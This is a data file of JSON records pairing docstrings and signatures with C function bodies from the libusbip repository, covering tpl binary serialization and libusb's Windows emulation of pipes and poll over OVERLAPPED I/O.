{"docstring": "/* gather tpl piecemeal from memory buffer (not fd) e.g., from a lower-level api */\n", "func_signal": "static int tpl_gather_mem( char *buf, size_t len, tpl_gather_t **gs, tpl_gather_cb *cb, void *data)", "code": "{\n    char *img, *tpl;\n    int keep_looping, cbrc=0;\n    size_t catlen;\n    uint32_t tpllen;\n\n    /* concatenate any partial tpl from last read with new buffer */\n    if (*gs) {\n        catlen = (*gs)->len + len;\n        if (tpl_hook.gather_max > 0 && \n            catlen > tpl_hook.gather_max) {\n            tpl_hook.free( (*gs)->img );\n            tpl_hook.free( (*gs) );\n            *gs = NULL;\n            tpl_hook.oops(\"tpl exceeds max length %d\\n\", \n                tpl_hook.gather_max);\n            return -2;              /* error, caller should stop accepting input from source*/\n        }\n        if ( (img = tpl_hook.realloc((*gs)->img, catlen)) == NULL) {\n            fatal_oom();\n        }\n        memcpy(img + (*gs)->len, buf, len);\n        tpl_hook.free(*gs);\n        *gs = NULL;\n    } else {\n        img = buf;\n        catlen = len;\n    }\n    /* isolate any full tpl(s) in img and invoke cb for each */\n    tpl = img;\n    keep_looping = (tpl+8 < img+catlen) ? 1 : 0;\n    while (keep_looping) {\n        if (strncmp(\"tpl\", tpl, 3) != 0) {\n            tpl_hook.oops(\"tpl prefix invalid\\n\");\n            if (img != buf) tpl_hook.free(img);\n            tpl_hook.free(*gs);\n            *gs = NULL;\n            return -3; /* error, caller should stop accepting input from source*/\n        }\n        memcpy(&tpllen,&tpl[4],4);\n        if (tpl_needs_endian_swap(tpl)) tpl_byteswap(&tpllen,4);\n        if (tpl+tpllen <= img+catlen) {\n            cbrc = (cb)(tpl,tpllen,data);  /* invoke cb for tpl image */\n            tpl += tpllen;               /* point to next tpl image */\n            if (cbrc < 0) keep_looping = 0;\n            else keep_looping = (tpl+8 < img+catlen) ? 1 : 0;\n        } else keep_looping=0;\n    } \n    /* check if app callback requested closure of tpl source */\n    if (cbrc < 0) {\n        tpl_hook.oops(\"tpl_mem_gather aborted by app callback\\n\");\n        if (img != buf) tpl_hook.free(img);\n        if (*gs) tpl_hook.free(*gs);\n        *gs = NULL;\n        return -4;\n    }\n    /* store any leftover, partial tpl fragment for next read */\n    if (tpl == img && img != buf) {  \n        /* consumed nothing from img!=buf */\n        if ( (*gs = tpl_hook.malloc(sizeof(tpl_gather_t))) == NULL ) {\n            fatal_oom();\n        }\n        (*gs)->img = tpl;\n        (*gs)->len = catlen;\n    } else if (tpl < img+catlen) {  \n        /* consumed 1+ tpl(s) from img!=buf or 0 from img==buf */\n        if ( (*gs = tpl_hook.malloc(sizeof(tpl_gather_t))) == NULL ) {\n            fatal_oom();\n        }\n        if ( ((*gs)->img = tpl_hook.malloc(img+catlen - tpl)) == NULL ) {\n            fatal_oom();\n        }\n        (*gs)->len = img+catlen - tpl;\n        memcpy( (*gs)->img, tpl, img+catlen - tpl);\n        /* free partially consumed concat buffer if used */\n        if (img != buf) tpl_hook.free(img); \n    } else {                        /* tpl(s) fully consumed */\n        /* free consumed concat buffer if used */\n        if (img != buf) tpl_hook.free(img); \n    }\n    return 1;\n}", "path": "include\\tpl\\tpl.c", "repo_name": "forensix/libusbip", "stars": 99, "license": "None", "language": "c", "size": 281}
{"docstring": "/*\n * Create a fake pipe.\n * As libusb only uses pipes for signaling, all we need from a pipe is an\n * event. To that extent, we create a single wfd and overlapped as a means\n * to access that event.\n */\n", "func_signal": "int usbi_pipe(int filedes[2])", "code": "{\n\tint i;\n\tHANDLE handle;\n\tOVERLAPPED* overlapped;\n\n\tCHECK_INIT_POLLING;\n\n\toverlapped = calloc(1, sizeof(OVERLAPPED));\n\tif (overlapped == NULL) {\n\t\treturn -1;\n\t}\n\t// The overlapped must have status pending for signaling to work in poll\n\toverlapped->Internal = STATUS_PENDING;\n\toverlapped->InternalHigh = 0;\n\n\t// Read end of the \"pipe\"\n\thandle = CreateFileA(\"NUL\", 0, 0, NULL, OPEN_EXISTING, 0, NULL);\n\tif (handle == INVALID_HANDLE_VALUE) {\n\t\tusbi_err(NULL, \"could not create pipe: errcode %d\", (int)GetLastError());\n\t\tgoto out1;\n\t}\n\tfiledes[0] = _open_osfhandle((intptr_t)handle, _O_RDONLY);\n\t// We can use the same handle for both ends\n\tfiledes[1] = filedes[0];\n\tpoll_dbg(\"pipe filedes = %d\", filedes[0]);\n\n\t// Note: manual reset must be true (second param) as the reset occurs in read\n\toverlapped->hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);\n\tif(!overlapped->hEvent) {\n\t\tgoto out2;\n\t}\n\n\tfor (i=0; i<MAX_FDS; i++) {\n\t\tif (poll_fd[i].fd < 0) {\n\t\t\tEnterCriticalSection(&_poll_fd[i].mutex);\n\t\t\t// fd might have been allocated before we got to critical\n\t\t\tif (poll_fd[i].fd >= 0) {\n\t\t\t\tLeaveCriticalSection(&_poll_fd[i].mutex);\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tpoll_fd[i].fd = filedes[0];\n\t\t\tpoll_fd[i].handle = handle;\n\t\t\tpoll_fd[i].overlapped = overlapped;\n\t\t\t// There's no polling on the write end, so we just use READ for our needs\n\t\t\tpoll_fd[i].rw = RW_READ;\n\t\t\t_poll_fd[i].original_handle = INVALID_HANDLE_VALUE;\n\t\t\tLeaveCriticalSection(&_poll_fd[i].mutex);\n\t\t\treturn 0;\n\t\t}\n\t}\n\n\tCloseHandle(overlapped->hEvent);\nout2:\n\tCloseHandle(handle);\nout1:\n\tfree(overlapped);\n\treturn -1;\n}", "path": "include\\libusb\\os\\poll_windows.c", "repo_name": "forensix/libusbip", "stars": 99, "license": "None", "language": "c", "size": 281}
{"docstring": "/*\n * Create both an fd and an OVERLAPPED from an open Windows handle, so that\n * it can be used with our polling function\n * The handle MUST support overlapped transfers (usually requires CreateFile\n * with FILE_FLAG_OVERLAPPED)\n * Return a pollable file descriptor struct, or INVALID_WINFD on error\n *\n * Note that the fd returned by this function is a per-transfer fd, rather\n * than a per-session fd and cannot be used for anything else but our\n * custom functions (the fd itself points to the NUL: device)\n * if you plan to do R/W on the same handle, you MUST create 2 fds: one for\n * read and one for write. Using a single R/W fd is unsupported and will\n * produce unexpected results\n */\n", "func_signal": "struct winfd usbi_create_fd(HANDLE handle, int access_mode)", "code": "{\n\tint i, fd;\n\tstruct winfd wfd = INVALID_WINFD;\n\tOVERLAPPED* overlapped = NULL;\n\n\tCHECK_INIT_POLLING;\n\n\tif ((handle == 0) || (handle == INVALID_HANDLE_VALUE)) {\n\t\treturn INVALID_WINFD;\n\t}\n\n\tif ((access_mode != _O_RDONLY) && (access_mode != _O_WRONLY)) {\n\t\tusbi_warn(NULL, \"only one of _O_RDONLY or _O_WRONLY are supported.\\n\"\n\t\t\t\"If you want to poll for R/W simultaneously, create multiple fds from the same handle.\");\n\t\treturn INVALID_WINFD;\n\t}\n\tif (access_mode == _O_RDONLY) {\n\t\twfd.rw = RW_READ;\n\t} else {\n\t\twfd.rw = RW_WRITE;\n\t}\n\n\t// Ensure that we get a non system conflicting unique fd\n\tfd = _open_osfhandle((intptr_t)CreateFileA(\"NUL\", 0, 0,\n\t\tNULL, OPEN_EXISTING, 0, NULL), _O_RDWR);\n\tif (fd < 0) {\n\t\treturn INVALID_WINFD;\n\t}\n\n\toverlapped = create_overlapped();\n\tif(overlapped == NULL) {\n\t\t_close(fd);\n\t\treturn INVALID_WINFD;\n\t}\n\n\tfor (i=0; i<MAX_FDS; i++) {\n\t\tif (poll_fd[i].fd < 0) {\n\t\t\tEnterCriticalSection(&_poll_fd[i].mutex);\n\t\t\t// fd might have been removed before we got to critical\n\t\t\tif (poll_fd[i].fd >= 0) {\n\t\t\t\tLeaveCriticalSection(&_poll_fd[i].mutex);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\twfd.fd = fd;\n\t\t\t// Attempt to emulate some of the CancelIoEx behaviour on platforms\n\t\t\t// that don't have it\n\t\t\tif (!CancelIoEx_Available) {\n\t\t\t\t_poll_fd[i].thread_id = GetCurrentThreadId();\n\t\t\t\tif (!DuplicateHandle(GetCurrentProcess(), handle, GetCurrentProcess(),\n\t\t\t\t\t&wfd.handle, 0, TRUE, DUPLICATE_SAME_ACCESS)) {\n\t\t\t\t\tusbi_dbg(\"could not duplicate handle for CancelIo - using original one\");\n\t\t\t\t\twfd.handle = handle;\n\t\t\t\t\t// Make sure we won't close the original handle on fd deletion then\n\t\t\t\t\t_poll_fd[i].original_handle = INVALID_HANDLE_VALUE;\n\t\t\t\t} else {\n\t\t\t\t\t_poll_fd[i].original_handle = handle;\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\twfd.handle = handle;\n\t\t\t}\n\t\t\twfd.overlapped = overlapped;\n\t\t\tmemcpy(&poll_fd[i], &wfd, sizeof(struct winfd));\n\t\t\tLeaveCriticalSection(&_poll_fd[i].mutex);\n#if defined(DYNAMIC_FDS)\n\t\t\tusbi_mutex_lock(&new_fd_mutex);\n\t\t\tnew_fd[nb_new_fds++] = overlapped->hEvent;\n\t\t\tusbi_mutex_unlock(&new_fd_mutex);\n\t\t\t// Notify poll that fds have been updated\n\t\t\tSetEvent(fd_update);\n#endif\n\t\t\treturn wfd;\n\t\t}\n\t}\n\tfree_overlapped(overlapped);\n\t_close(fd);\n\treturn INVALID_WINFD;\n}", "path": "include\\libusb\\os\\poll_windows.c", "repo_name": "forensix/libusbip", "stars": 99, "license": "None", "language": "c", "size": 281}
{"docstring": "/*\n * synchronous write for fake \"pipe\" signaling\n */\n", "func_signal": "ssize_t usbi_write(int fd, const void *buf, size_t count)", "code": "{\n\tint index;\n\n\tCHECK_INIT_POLLING;\n\n\tif (count != sizeof(unsigned char)) {\n\t\tusbi_err(NULL, \"this function should only used for signaling\");\n\t\treturn -1;\n\t}\n\n\tindex = _fd_to_index_and_lock(fd);\n\n\tif ( (index < 0) || (poll_fd[index].overlapped == NULL) ) {\n\t\terrno = EBADF;\n\t\tif (index >= 0) {\n\t\t\tLeaveCriticalSection(&_poll_fd[index].mutex);\n\t\t}\n\t\treturn -1;\n\t}\n\n\tpoll_dbg(\"set pipe event (fd = %d, thread = %08X)\", index, GetCurrentThreadId());\n\tSetEvent(poll_fd[index].overlapped->hEvent);\n\tpoll_fd[index].overlapped->Internal = STATUS_WAIT_0;\n\t// If two threads write on the pipe at the same time, we need to\n\t// process two separate reads => use the overlapped as a counter\n\tpoll_fd[index].overlapped->InternalHigh++;\n\n\tLeaveCriticalSection(&_poll_fd[index].mutex);\n\treturn sizeof(unsigned char);\n}", "path": "include\\libusb\\os\\poll_windows.c", "repo_name": "forensix/libusbip", "stars": 99, "license": "None", "language": "c", "size": 281}
{"docstring": "/*\n * The functions below perform various conversions between fd, handle and OVERLAPPED\n */\n", "func_signal": "struct winfd fd_to_winfd(int fd)", "code": "{\n\tint i;\n\tstruct winfd wfd;\n\n\tCHECK_INIT_POLLING;\n\n\tif (fd <= 0)\n\t\treturn INVALID_WINFD;\n\n\tfor (i=0; i<MAX_FDS; i++) {\n\t\tif (poll_fd[i].fd == fd) {\n\t\t\tEnterCriticalSection(&_poll_fd[i].mutex);\n\t\t\t// fd might have been deleted before we got to critical\n\t\t\tif (poll_fd[i].fd != fd) {\n\t\t\t\tLeaveCriticalSection(&_poll_fd[i].mutex);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tmemcpy(&wfd, &poll_fd[i], sizeof(struct winfd));\n\t\t\tLeaveCriticalSection(&_poll_fd[i].mutex);\n\t\t\treturn wfd;\n\t\t}\n\t}\n\treturn INVALID_WINFD;\n}", "path": "include\\libusb\\os\\poll_windows.c", "repo_name": "forensix/libusbip", "stars": 99, "license": "None", "language": "c", "size": 281}
{"docstring": "/* Specialized function that unpacks only the root's A nodes, after tpl_load  */\n", "func_signal": "static int tpl_unpackA0(tpl_node *r)", "code": "{\n    tpl_node *n, *c;\n    uint32_t slen;\n    int rc=1,fidx,i;\n    void *dv;\n    size_t A_bytes, itermax;\n    tpl_pound_data *pd;\n\n    n = r;\n    dv = tpl_find_data_start( ((tpl_root_data*)(r->data))->mmap.text);\n\n    c=n->children;\n    while (c)  {\n        switch (c->type) {\n            case TPL_TYPE_BYTE:\n            case TPL_TYPE_DOUBLE:\n            case TPL_TYPE_INT32:\n            case TPL_TYPE_UINT32:\n            case TPL_TYPE_INT64:\n            case TPL_TYPE_UINT64:\n            case TPL_TYPE_INT16:\n            case TPL_TYPE_UINT16:\n                for(fidx=0;fidx < c->num; fidx++) {\n                    dv = (void*)((uintptr_t)dv + tpl_types[c->type].sz);\n                }\n                break;\n            case TPL_TYPE_BIN:\n                memcpy(&slen,dv,sizeof(uint32_t));\n                if (((tpl_root_data*)(r->data))->flags & TPL_XENDIAN)\n                    tpl_byteswap(&slen, sizeof(uint32_t));\n                dv = (void*)((uintptr_t)dv + sizeof(uint32_t));\n                dv = (void*)((uintptr_t)dv + slen);\n                break;\n            case TPL_TYPE_STR:\n                for(i=0; i<c->num; i++) {\n                  memcpy(&slen,dv,sizeof(uint32_t));\n                  if (((tpl_root_data*)(r->data))->flags & TPL_XENDIAN)\n                      tpl_byteswap(&slen, sizeof(uint32_t));\n                  if (((tpl_root_data*)(r->data))->flags & TPL_OLD_STRING_FMT)\n                    slen += 1;\n                  dv = (void*)((uintptr_t)dv + sizeof(uint32_t));\n                  if (slen>1) dv = (void*)((uintptr_t)dv + slen-1);\n                }\n                break;\n            case TPL_TYPE_POUND:\n                /* iterate over the preceding nodes */\n                itermax = c->num;\n                pd = (tpl_pound_data*)c->data;\n                if (++(pd->iternum) < itermax) {\n                  c = pd->iter_start_node;\n                  continue;\n                } else { /* loop complete. */\n                  pd->iternum = 0;\n                }\n                break;\n            case TPL_TYPE_ARY:\n                if ( tpl_serlen(r,c,dv, &A_bytes) == -1) \n                    tpl_hook.fatal(\"internal error in unpackA0\\n\");\n                memcpy( &((tpl_atyp*)(c->data))->num, dv, sizeof(uint32_t));\n                if (((tpl_root_data*)(r->data))->flags & TPL_XENDIAN)\n                    tpl_byteswap(&((tpl_atyp*)(c->data))->num, sizeof(uint32_t));\n                ((tpl_atyp*)(c->data))->cur = (void*)((uintptr_t)dv+sizeof(uint32_t));\n                dv = (void*)((uintptr_t)dv + A_bytes);\n                break;\n            default:\n                tpl_hook.fatal(\"unsupported format character\\n\");\n                break;\n        }\n        c=c->next;\n    }\n    return rc;\n}", "path": "include\\tpl\\tpl.c", "repo_name": "forensix/libusbip", "stars": 99, "license": "None", "language": "c", "size": 281}
{"docstring": "/* In-place byte order swapping of a word of length \"len\" bytes */\n", "func_signal": "static void tpl_byteswap(void *word, int len)", "code": "{\n    int i;\n    char c, *w;\n    w = (char*)word;\n    for(i=0; i<len/2; i++) {\n        c = w[i];\n        w[i] = w[len-1-i];\n        w[len-1-i] = c;\n    }\n}", "path": "include\\tpl\\tpl.c", "repo_name": "forensix/libusbip", "stars": 99, "license": "None", "language": "c", "size": 281}
{"docstring": "/* Find the i'th packable ('A' node) */\n", "func_signal": "static tpl_node *tpl_find_i(tpl_node *n, int i)", "code": "{\n    int j=0;\n    tpl_pidx *pidx;\n    if (n->type != TPL_TYPE_ROOT) return NULL;\n    if (i == 0) return n;  /* packable 0 is root */\n    for(pidx=((tpl_root_data*)(n->data))->pidx; pidx; pidx=pidx->next) {\n        if (++j == i) return pidx->node;\n    }\n    return NULL;\n}", "path": "include\\tpl\\tpl.c", "repo_name": "forensix/libusbip", "stars": 99, "license": "None", "language": "c", "size": 281}
{"docstring": "/* Used in S(..) formats to pack several fields from a structure based on \n * only the structure address. We need to calculate field addresses \n * manually taking into account the size of the fields and intervening padding.\n * The wrinkle is that double is not normally aligned on x86-32 but the\n * -malign-double compiler option causes it to be. Double are aligned\n * on Sparc, and apparently on 64 bit x86. We use a helper structure \n * to detect whether double is aligned in this compilation environment.\n */\n", "func_signal": "char *calc_field_addr(tpl_node *parent, int type,char *struct_addr, int ordinal)", "code": "{\n    tpl_node *prev;\n    int offset;\n    int align_sz;\n\n    if (ordinal == 1) return struct_addr;  /* first field starts on structure address */\n\n    /* generate enough padding so field addr is divisible by it's align_sz. 4, 8, etc */\n    prev = parent->children->prev; \n    switch(type) {\n      case TPL_TYPE_DOUBLE:\n        align_sz = sizeof(struct tpl_double_alignment_detector) > 12 ? 8 : 4; \n        break;\n      case TPL_TYPE_INT64:\n      case TPL_TYPE_UINT64:\n        align_sz = sizeof(struct tpl_int64_alignment_detector) > 12 ? 8 : 4; \n        break;\n      default:\n        align_sz = tpl_types[type].sz;\n        break;\n    }\n    offset = ((uintptr_t)prev->addr - (uintptr_t)struct_addr)\n            + (tpl_types[prev->type].sz * prev->num);\n    offset = (offset + align_sz - 1) / align_sz * align_sz;\n    return struct_addr + offset;\n}", "path": "include\\tpl\\tpl.c", "repo_name": "forensix/libusbip", "stars": 99, "license": "None", "language": "c", "size": 281}
{"docstring": "/* Get the fmt # lengths as a contiguous buffer of ints (length num_fxlens) */\n", "func_signal": "static int *tpl_fxlens(tpl_node *r, int *num_fxlens)", "code": "{\n    *num_fxlens = ((tpl_root_data*)(r->data))->num_fxlens;\n    return ((tpl_root_data*)(r->data))->fxlens;\n}", "path": "include\\tpl\\tpl.c", "repo_name": "forensix/libusbip", "stars": 99, "license": "None", "language": "c", "size": 281}
{"docstring": "/* This function expects the caller to have set up a memory buffer of \n * adequate size to hold the serialized tpl. The sz parameter must be\n * the result of tpl_ser_osz(r).\n */\n", "func_signal": "static int tpl_dump_to_mem(tpl_node *r,void *addr,size_t sz)", "code": "{\n    uint32_t slen, sz32;\n    int *fxlens, num_fxlens, i;\n    void *dv;\n    char *fmt,flags;\n    tpl_node *c, *np;\n    tpl_pound_data *pd;\n    size_t itermax;\n\n    fmt = tpl_fmt(r);\n    flags = 0;\n    if (tpl_cpu_bigendian()) flags |= TPL_FL_BIGENDIAN;\n    if (strchr(fmt,'s')) flags |= TPL_FL_NULLSTRINGS;\n    sz32 = sz; \n\n    dv = addr;\n    dv = tpl_cpv(dv,TPL_MAGIC,3);         /* copy tpl magic prefix */\n    dv = tpl_cpv(dv,&flags,1);            /* copy flags byte */\n    dv = tpl_cpv(dv,&sz32,sizeof(uint32_t));/* overall length (inclusive) */\n    dv = tpl_cpv(dv,fmt,strlen(fmt)+1);   /* copy format with NUL-term */\n    fxlens = tpl_fxlens(r,&num_fxlens);\n    dv = tpl_cpv(dv,fxlens,num_fxlens*sizeof(uint32_t));/* fmt # lengths */\n\n    /* serialize the tpl content, iterating over direct children of root */\n    c = r->children;\n    while (c) {\n        switch (c->type) {\n            case TPL_TYPE_BYTE:\n            case TPL_TYPE_DOUBLE:\n            case TPL_TYPE_INT32:\n            case TPL_TYPE_UINT32:\n            case TPL_TYPE_INT64:\n            case TPL_TYPE_UINT64:\n            case TPL_TYPE_INT16:\n            case TPL_TYPE_UINT16:\n                dv = tpl_cpv(dv,c->data,tpl_types[c->type].sz * c->num);\n                break;\n            case TPL_TYPE_BIN:\n                slen = (*(tpl_bin**)(c->data))->sz;\n                dv = tpl_cpv(dv,&slen,sizeof(uint32_t));  /* buffer len */\n                dv = tpl_cpv(dv,(*(tpl_bin**)(c->data))->addr,slen); /* buf */\n                break;\n            case TPL_TYPE_STR:\n                for(i=0; i < c->num; i++) {\n                  char *str = ((char**)c->data)[i];\n                  slen = str ? strlen(str)+1 : 0;\n                  dv = tpl_cpv(dv,&slen,sizeof(uint32_t));  /* string len */\n                  if (slen>1) dv = tpl_cpv(dv,str,slen-1); /*string*/\n                }\n                break;\n            case TPL_TYPE_ARY:\n                dv = tpl_dump_atyp(c,(tpl_atyp*)c->data,dv);\n                break;\n            case TPL_TYPE_POUND:\n                 pd = (tpl_pound_data*)c->data;\n                 itermax = c->num;\n                 if (++(pd->iternum) < itermax) {\n\n                   /* in start or midst of loop. advance data pointers. */\n                   for(np=pd->iter_start_node; np != c; np = np->next) {\n                     np->data = (char*)(np->data) + \n                                (tpl_types[np->type].sz * np->num);\n                   }\n                   /* do next iteration */\n                   c = pd->iter_start_node;\n                   continue;\n\n                 } else { /* loop complete. */\n                 \n                   /* reset iteration index and addr/data pointers. */\n                   pd->iternum = 0;\n                   for(np=pd->iter_start_node; np != c; np = np->next) {\n                     np->data = (char*)(np->data) - ((itermax-1) * \n                                                     tpl_types[np->type].sz * \n                                                     np->num);\n                   }\n\n                 }\n                 break;\n            default:\n                tpl_hook.fatal(\"unsupported format character\\n\");\n                break;\n        }\n        c = c->next;\n    }\n\n    return 0;\n}", "path": "include\\tpl\\tpl.c", "repo_name": "forensix/libusbip", "stars": 99, "license": "None", "language": "c", "size": 281}
{"docstring": "/*\n * POSIX poll equivalent, using Windows OVERLAPPED\n * Currently, this function only accepts one of POLLIN or POLLOUT per fd\n * (but you can create multiple fds from the same handle for read and write)\n */\n", "func_signal": "int usbi_poll(struct pollfd *fds, unsigned int nfds, int timeout)", "code": "{\n\tunsigned i;\n\tint index, object_index, triggered;\n\tHANDLE *handles_to_wait_on;\n\tint *handle_to_index;\n\tDWORD nb_handles_to_wait_on = 0;\n\tDWORD ret;\n\n#if defined(DYNAMIC_FDS)\n\tDWORD nb_extra_handles = 0;\n\tunsigned j;\n\n\t// To address the possibility of missing new fds between the time the new\n\t// pollable fd set is assembled, and the ResetEvent() call below, an\n\t// additional new_fd[] HANDLE table is used for any new fd that was created\n\t// since the last call to poll (see below)\n\tResetEvent(fd_update);\n\n\t// At this stage, any new fd creation will be detected through the fd_update\n\t// event notification, and any previous creation that we may have missed\n\t// will be picked up through the existing new_fd[] table.\n#endif\n\n\tCHECK_INIT_POLLING;\n\n\ttriggered = 0;\n\thandles_to_wait_on = malloc((nfds+1)*sizeof(HANDLE));\t// +1 for fd_update\n\thandle_to_index = malloc(nfds*sizeof(int));\n\tif ((handles_to_wait_on == NULL) || (handle_to_index == NULL)) {\n\t\terrno = ENOMEM;\n\t\ttriggered = -1;\n\t\tgoto poll_exit;\n\t}\n\n\tfor (i = 0; i < nfds; ++i) {\n\t\tfds[i].revents = 0;\n\n\t\t// Only one of POLLIN or POLLOUT can be selected with this version of poll (not both)\n\t\tif ((fds[i].events & ~POLLIN) && (!(fds[i].events & POLLOUT))) {\n\t\t\tfds[i].revents |= POLLERR;\n\t\t\terrno = EACCES;\n\t\t\tusbi_warn(NULL, \"unsupported set of events\");\n\t\t\ttriggered = -1;\n\t\t\tgoto poll_exit;\n\t\t}\n\n\t\tindex = _fd_to_index_and_lock(fds[i].fd);\n\t\tpoll_dbg(\"fd[%d]=%d: (overlapped=%p) got events %04X\", i, poll_fd[index].fd, poll_fd[index].overlapped, fds[i].events);\n\n\t\tif ( (index < 0) || (poll_fd[index].handle == INVALID_HANDLE_VALUE)\n\t\t  || (poll_fd[index].handle == 0) || (poll_fd[index].overlapped == NULL)) {\n\t\t\tfds[i].revents |= POLLNVAL | POLLERR;\n\t\t\terrno = EBADF;\n\t\t\tif (index >= 0) {\n\t\t\t\tLeaveCriticalSection(&_poll_fd[index].mutex);\n\t\t\t}\n\t\t\tusbi_warn(NULL, \"invalid fd\");\n\t\t\ttriggered = -1;\n\t\t\tgoto poll_exit;\n\t\t}\n\n\t\t// IN or OUT must match our fd direction\n\t\tif ((fds[i].events & POLLIN) && (poll_fd[index].rw != RW_READ)) {\n\t\t\tfds[i].revents |= POLLNVAL | POLLERR;\n\t\t\terrno = EBADF;\n\t\t\tusbi_warn(NULL, \"attempted POLLIN on fd without READ access\");\n\t\t\tLeaveCriticalSection(&_poll_fd[index].mutex);\n\t\t\ttriggered = -1;\n\t\t\tgoto poll_exit;\n\t\t}\n\n\t\tif ((fds[i].events & POLLOUT) && (poll_fd[index].rw != RW_WRITE)) {\n\t\t\tfds[i].revents |= POLLNVAL | POLLERR;\n\t\t\terrno = EBADF;\n\t\t\tusbi_warn(NULL, \"attempted POLLOUT on fd without WRITE access\");\n\t\t\tLeaveCriticalSection(&_poll_fd[index].mutex);\n\t\t\ttriggered = -1;\n\t\t\tgoto poll_exit;\n\t\t}\n\n\t\t// The following macro only works if overlapped I/O was reported pending\n\t\tif ( (HasOverlappedIoCompleted(poll_fd[index].overlapped))\n\t\t  || (HasOverlappedIoCompletedSync(poll_fd[index].overlapped)) ) {\n\t\t\tpoll_dbg(\"  completed\");\n\t\t\t// checks above should ensure this works:\n\t\t\tfds[i].revents = fds[i].events;\n\t\t\ttriggered++;\n\t\t} else {\n\t\t\thandles_to_wait_on[nb_handles_to_wait_on] = poll_fd[index].overlapped->hEvent;\n\t\t\thandle_to_index[nb_handles_to_wait_on] = i;\n#if defined(DYNAMIC_FDS)\n\t\t\t// If this fd from the poll set is also part of the new_fd event handle table, remove it\n\t\t\tusbi_mutex_lock(&new_fd_mutex);\n\t\t\tfor (j=0; j<nb_new_fds; j++) {\n\t\t\t\tif (handles_to_wait_on[nb_handles_to_wait_on] == new_fd[j]) {\n\t\t\t\t\tnew_fd[j] = INVALID_HANDLE_VALUE;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tusbi_mutex_unlock(&new_fd_mutex);\n#endif\n\t\t\tnb_handles_to_wait_on++;\n\t\t}\n\t\tLeaveCriticalSection(&_poll_fd[index].mutex);\n\t}\n#if defined(DYNAMIC_FDS)\n\t// At this stage, new_fd[] should only contain events from fds that\n\t// have been added since the last call to poll, but are not (yet) part\n\t// of the pollable fd set. Typically, these would be from fds that have\n\t// been created between the construction of the fd set and the calling\n\t// of poll.\n\t// Event if we won't be able to return usable poll data on these events,\n\t// make sure we monitor them to return an EINTR code\n\tusbi_mutex_lock(&new_fd_mutex); // We could probably do without\n\tfor (i=0; i<nb_new_fds; i++) {\n\t\tif (new_fd[i] != INVALID_HANDLE_VALUE) {\n\t\t\thandles_to_wait_on[nb_handles_to_wait_on++] = new_fd[i];\n\t\t\tnb_extra_handles++;\n\t\t}\n\t}\n\tusbi_mutex_unlock(&new_fd_mutex);\n\tpoll_dbg(\"dynamic_fds: added %d extra handles\", nb_extra_handles);\n#endif\n\n\t// If nothing was triggered, wait on all fds that require it\n\tif ((timeout != 0) && (triggered == 0) && (nb_handles_to_wait_on != 0)) {\n#if defined(DYNAMIC_FDS)\n\t\t// Register for fd update notifications\n\t\thandles_to_wait_on[nb_handles_to_wait_on++] = fd_update;\n\t\tnb_extra_handles++;\n#endif\n\t\tif (timeout < 0) {\n\t\t\tpoll_dbg(\"starting infinite wait for %d handles...\", (int)nb_handles_to_wait_on);\n\t\t} else {\n\t\t\tpoll_dbg(\"starting %d ms wait for %d handles...\", timeout, (int)nb_handles_to_wait_on);\n\t\t}\n\t\tret = WaitForMultipleObjects(nb_handles_to_wait_on, handles_to_wait_on,\n\t\t\tFALSE, (timeout<0)?INFINITE:(DWORD)timeout);\n\t\tobject_index = ret-WAIT_OBJECT_0;\n\t\tif ((object_index >= 0) && ((DWORD)object_index < nb_handles_to_wait_on)) {\n#if defined(DYNAMIC_FDS)\n\t\t\tif ((DWORD)object_index >= (nb_handles_to_wait_on-nb_extra_handles)) {\n\t\t\t\t// Detected fd update => flag a poll interruption\n\t\t\t\tif ((DWORD)object_index == (nb_handles_to_wait_on-1))\n\t\t\t\t\tpoll_dbg(\"  dynamic_fds: fd_update event\");\n\t\t\t\telse\n\t\t\t\t\tpoll_dbg(\"  dynamic_fds: new fd I/O event\");\n\t\t\t\terrno = EINTR;\n\t\t\t\ttriggered = -1;\n\t\t\t\tgoto poll_exit;\n\t\t\t}\n#endif\n\t\t\tpoll_dbg(\"  completed after wait\");\n\t\t\ti = handle_to_index[object_index];\n\t\t\tindex = _fd_to_index_and_lock(fds[i].fd);\n\t\t\tfds[i].revents = fds[i].events;\n\t\t\ttriggered++;\n\t\t\tif (index >= 0) {\n\t\t\t\tLeaveCriticalSection(&_poll_fd[index].mutex);\n\t\t\t}\n\t\t} else if (ret == WAIT_TIMEOUT) {\n\t\t\tpoll_dbg(\"  timed out\");\n\t\t\ttriggered = 0;\t// 0 = timeout\n\t\t} else {\n\t\t\terrno = EIO;\n\t\t\ttriggered = -1;\t// error\n\t\t}\n\t}\n\npoll_exit:\n\tif (handles_to_wait_on != NULL) {\n\t\tfree(handles_to_wait_on);\n\t}\n\tif (handle_to_index != NULL) {\n\t\tfree(handle_to_index);\n\t}\n#if defined(DYNAMIC_FDS)\n\tusbi_mutex_lock(&new_fd_mutex);\n\tnb_new_fds = 0;\n\tusbi_mutex_unlock(&new_fd_mutex);\n#endif\n\treturn triggered;\n}", "path": "include\\libusb\\os\\poll_windows.c", "repo_name": "forensix/libusbip", "stars": 99, "license": "None", "language": "c", "size": 281}
{"docstring": "// _open_osfhandle() is not available on cygwin, but we can emulate\n// it for our needs with cygwin_attach_handle_to_fd()\n", "func_signal": "static inline int _open_osfhandle(intptr_t osfhandle, int flags)", "code": "{\n\tint access_mode;\n\tswitch (flags) {\n\tcase _O_RDONLY:\n\t\taccess_mode = GENERIC_READ;\n\t\tbreak;\n\tcase _O_WRONLY:\n\t\taccess_mode = GENERIC_WRITE;\n\t\tbreak;\n\tcase _O_RDWR:\n\t\taccess_mode = GENERIC_READ|GENERIC_WRITE;\n\t\tbreak;\n\tdefault:\n\t\tusbi_err(NULL, \"unsupported access mode\");\n\t\treturn -1;\n\t}\n\treturn cygwin_attach_handle_to_fd(\"/dev/null\", -1, (HANDLE)osfhandle, -1, access_mode);\n}", "path": "include\\libusb\\os\\poll_windows.c", "repo_name": "forensix/libusbip", "stars": 99, "license": "None", "language": "c", "size": 281}
